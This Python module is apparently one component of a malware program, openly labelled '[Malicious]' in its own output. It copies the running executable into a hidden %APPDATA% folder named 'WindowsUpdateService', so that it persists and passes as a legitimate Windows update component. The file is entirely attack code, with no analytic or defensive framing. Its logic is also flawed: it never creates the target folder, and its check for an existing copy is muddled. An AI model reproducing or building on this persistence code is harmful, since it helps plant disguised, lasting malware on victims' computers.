"""
Delivery Function 3: Copy to Hidden Location
Copies executable to hidden folder for persistence
"""

import os
import sys
import shutil

def copy_to_hidden_location():
    """
    Copy executable to hidden folder
    Returns: Path to copied executable or None if failed
    """
    print("[Malicious] Function 3: Copying to hidden location...")
    
    try:
        # Get current executable path
        current_exe = sys.argv[0]
        
        # Get hidden folder path
        appdata = os.getenv('APPDATA')
        hidden_folder = os.path.join(appdata, "WindowsUpdateService")
        hidden_exe = os.path.join(hidden_folder, "WindowsUpdateService.exe")
        
        # Copy if not already there
        if not os.path.exists(hidden_exe) or os.path.abspath(current_exe) != os.path.abspath(hidden_exe):
            shutil.copy2(current_exe, hidden_exe)
            print(f"[Malicious] Copied to: {hidden_exe}")
            return hidden_exe
        else:
            print(f"[Malicious] Already running from hidden location")
            return hidden_exe
    except Exception as e:
        print(f"[Malicious] Error copying to hidden location: {e}")
        return None
